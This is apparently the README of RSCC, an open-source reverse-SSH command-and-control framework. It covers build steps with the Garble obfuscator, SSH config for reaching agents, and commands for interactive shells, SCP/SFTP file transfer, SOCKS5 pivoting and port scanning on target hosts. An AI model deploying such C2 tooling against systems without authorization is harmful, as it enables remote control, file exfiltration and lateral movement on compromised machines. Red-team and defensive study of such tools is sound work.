<div align="center">
  <h1>RSCC</h1>
  <tt>~ Reverse SSH Command & Control ~</tt><br/>
  <img src=".github/rscc.png"/><br/>
</div>

RSCC is an open source, cross-platform command & control framework that allows you to control your agents (targets) via SSH.

## Features

Since RSCC is based on SSH, it has the following features:

- Cross-platform agents
- Fully interactive shell
- File transfer via SCP or SFTP
- Local / Remote  port forwarding
- Chain SOCKS5 proxy via SSH -D

**Also you can extend agent with your own SSH subsystems!**

As an example, there is a [port scanner subsystem](./pkg/agent/internal/sshd/subsystems/pscan.go) that allows you to scan the target host for open ports from the agent.

<details>
<summary>Example:</summary><br/>

```sh
ssh rscc+agent_id -s pscan -p 139,445,3389 10.10.10.10
```

</details>

## Getting Started

### Prerequisites

To use RSCC, you need to have following tools on server machine:

- Go 1.20+ (https://go.dev/doc/install)
- Garble (https://github.com/burrowers/garble)

### Installation

Just download binary from [latest release](https://github.com/nu11zy/rscc/releases/latest) and run it.

Or build it from source:

```sh
git clone https://github.com/nu11zy/rscc.git
cd rscc
make build
```

## Usage

Before you start, you need to create admin user:

```sh
./rscc admin -n <username> -k <public_key>
```

Now you can start RSCC server:

```sh
./rscc start
```

After that, you need to update your SSH config (for example, `~/.ssh/config`):

```yml
# Server config
Host rscc
  HostName 127.0.0.1 # RSCC server IP
  Port 55022         # RSCC operator port
  User nu11z         # Operator username

# Agent config
Host rscc+*
  ProxyJump rscc
  UserKnownHostsFile /dev/null
  StrictHostKeyChecking no
```

Now you can connect to RSCC server and generate agents or add operators:

```sh
ssh rscc
```

After agent is executed, you can connect to it:

```sh
ssh rscc+session_id
```

**TIP:** You can quickly get `session_id` from RSCC server:

```sh
ssh rscc session list
```

### More examples

<details>
<summary>SOCKS5 Proxy:</summary><br/>

```sh
ssh -D 9090 rscc+agent_id
```

Now you can use `127.0.0.1:9090` as SOCKS5 proxy.

</details>

<details>
<summary>Transfer files:</summary><br/>

SCP:

```sh
scp /path/to/local/file rscc+agent_id:/path/to/remote/file
```

SFTP:

```sh
sftp rscc+agent_id
```

</details>

## Roadmap

- [ ] Support for agent listeners with custom protocols (HTTP, WS, gRPC)
- [ ] Add more subsystems *(execute-assembly, port forward, inject, etc)*
- [ ] Webhooks for events
- [ ] HTTP server for serving agents
- [ ] More documentation
